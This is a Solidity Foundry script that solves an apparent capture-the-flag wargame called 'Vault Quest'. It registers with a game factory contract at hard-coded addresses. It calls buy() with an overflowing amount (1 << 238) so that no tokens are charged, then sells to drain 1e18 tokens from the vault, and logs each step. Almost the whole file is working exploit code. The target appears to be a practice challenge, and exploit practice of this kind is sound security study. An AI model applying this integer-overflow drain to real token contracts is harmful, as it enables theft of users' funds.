// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import "forge-std/Script.sol";

interface IVaultToken {
    function balanceOf(address) external view returns (uint256);
}

interface IToken {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
    function WithrawFunds() external;
    function isComplete() external view returns (bool);
    function drained() external view returns (bool);
}

interface ITokenFactoryGame {
    function register(string calldata) external returns (address);
    function Complete(address token) external;
    function winners(uint256)
        external
        view
        returns (address winner, address token, string memory playerName);
}

contract OUExploit is Script {
    function run() external {
        vm.startBroadcast();
        
        // Use the known addresses
        address factoryAddress = 0x57194636816DdB2B0B0c257E679Db8553CeEDfa2;
        address vaultTokenAddress = 0x1F75cdb5c9F0513Cea9F3E8aaB9F3B49cedB405b;
        
        ITokenFactoryGame factory = ITokenFactoryGame(factoryAddress);
        IVaultToken vaultToken = IVaultToken(vaultTokenAddress);
        
        console.log("=== VAULT QUEST EXPLOIT ===");
        console.log("Factory address:", factoryAddress);
        console.log("Vault token address:", vaultTokenAddress);
        
        console.log("\n--- STEP 1: REGISTRATION ---");
        console.log("Registering with TokenFactoryGame...");
        address tokenAddress = factory.register("jvcByte");
        console.log("Token deployed at:", tokenAddress);
        
        IToken token = IToken(tokenAddress);
        
        console.log("\n--- STEP 2: INITIAL STATE CHECK ---");
        uint256 tokenBalance = vaultToken.balanceOf(tokenAddress);
        bool isCompleteInitial = token.isComplete();
        bool isDrainedInitial = token.drained();
        console.log("Token contract balance:", tokenBalance);
        console.log("isComplete():", isCompleteInitial);
        console.log("drained():", isDrainedInitial);
        
        uint256 overflowAmount = 1 << 238;
        console.log("Overflow amount to use:", overflowAmount);
        
        console.log("\n--- STEP 3: OVERFLOW BUY ---");
        console.log("Calling buy() with overflow amount...");
        console.log("This should cause transferFrom with 0 amount due to overflow");
        
        token.buy(overflowAmount);
        
        console.log("Buy completed successfully!");
        
        console.log("\n--- STEP 4: POST-BUY STATE CHECK ---");
        uint256 tokenBalanceAfterBuy = vaultToken.balanceOf(tokenAddress);
        console.log("Token contract balance after buy:", tokenBalanceAfterBuy);
        console.log("Balance change:", tokenBalance - tokenBalanceAfterBuy);
        
        console.log("\n--- STEP 5: SELL TOKENS ---");
        console.log("Calling sell(1) to drain tokens from vault...");
        console.log("This should transfer 1e18 tokens from token contract to attacker");
        
        token.sell(1);
        
        console.log("Sell completed successfully!");
        
        console.log("\n--- STEP 6: POST-SELL STATE CHECK ---");
        uint256 tokenBalanceAfterSell = vaultToken.balanceOf(tokenAddress);
        console.log("Token contract balance after sell:", tokenBalanceAfterSell);
        console.log("Total drained:", tokenBalance - tokenBalanceAfterSell);
        
        console.log("\n--- STEP 7: COMPLETION CHECK ---");
        bool isCompleteFinal = token.isComplete();
        bool isDrainedFinal = token.drained();
        console.log("isComplete():", isCompleteFinal);
        console.log("drained():", isDrainedFinal);
        
        // Check if challenge is complete
        if (isCompleteFinal && isDrainedFinal) {
            console.log("\n--- STEP 8: COMPLETE CHALLENGE ---");
            console.log("Calling Complete() on TokenFactoryGame...");
            factory.Complete(tokenAddress);
            console.log("Challenge completed!");
        } else {
            console.log("\n--- CHALLENGE NOT COMPLETE ---");
            console.log("isComplete:", isCompleteFinal, "(need true)");
            console.log("drained:", isDrainedFinal, "(need true)");
        }
        
        vm.stopBroadcast();
        
        console.log("\n=== EXPLOIT SUMMARY ===");
        console.log("Registration: SUCCESS");
        console.log("Overflow buy: SUCCESS (transferred 0 tokens)");
        console.log("Sell tokens: SUCCESS (drained 1e18 tokens)");
        console.log("Final isComplete:", isCompleteFinal);
        console.log("Final drained:", isDrainedFinal);
        
        if (isCompleteFinal && isDrainedFinal) {
            console.log("VAULT QUEST SOLVED!");
        } else {
            console.log("Challenge not yet complete");
        }
    }
}
